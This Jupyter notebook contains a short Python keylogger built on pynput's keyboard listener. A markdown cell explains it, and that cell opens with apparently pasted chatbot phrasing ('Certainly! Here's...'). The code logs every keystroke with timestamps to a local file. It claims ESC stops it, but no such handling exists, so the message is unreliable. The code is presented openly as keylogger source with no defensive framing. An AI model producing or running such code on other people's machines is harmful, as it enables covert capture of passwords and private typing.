{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "12adcf7f",
   "metadata": {},
   "source": [
    "# Certainly! Here's a text explanation of the code:\n",
    "\n",
    "Import Libraries:\n",
    "=\n",
    "The code starts by importing necessary libraries:\n",
    "os for operating system-related functions (though not used in this specific snippet).\n",
    "keyboard from pynput to monitor keyboard inputs.\n",
    "datetime to handle date and time for logging purposes.\n",
    "Define Log File Name:\n",
    "=\n",
    "A log file name is generated that includes the current date and time. This ensures that each log file is unique and easily identifiable by its timestamp.\n",
    "Function to Log Keystrokes:\n",
    "=\n",
    "The on_press function is designed to handle each keystroke. It attempts to write the pressed key and the timestamp to the log file. If the key is a special key (like Shift or Ctrl), it writes the key's representation instead.\n",
    "Start Keylogger:\n",
    "=\n",
    "The start_keylogger function sets up a listener to monitor keyboard events. It uses pynput's Listener class, which triggers the on_press function whenever a key is pressed.\n",
    "Main Function:\n",
    "=\n",
    "When the script runs, it prints a message indicating that the keylogger has started. It then calls the start_keylogger function to begin logging keystrokes. The listener will continue running until stopped manually."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "00ee1f78",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Import necessary libraries\n",
    "import os\n",
    "from pynput import keyboard\n",
    "import datetime\n",
    "\n",
    "# Define the log file name with timestamp\n",
    "log_file = f\"keylogger_log_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.txt\"\n",
    "\n",
    "# Function to log keystrokes\n",
    "def on_press(key):\n",
    "    try:\n",
    "        with open(log_file, 'a') as f:\n",
    "            f.write(f'{datetime.datetime.now()} - {key.char}\\n')\n",
    "    except AttributeError:\n",
    "        with open(log_file, 'a') as f:\n",
    "            f.write(f'{datetime.datetime.now()} - {key}\\n')\n",
    "\n",
    "# Function to start the keylogger\n",
    "def start_keylogger():\n",
    "    # Create a listener for keyboard events\n",
    "    with keyboard.Listener(on_press=on_press) as listener:\n",
    "        listener.join()\n",
    "\n",
    "# Main function\n",
    "if __name__ == \"__main__\":\n",
    "    print(\"Starting keylogger. Press ESC to stop.\")\n",
    "    start_keylogger()"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
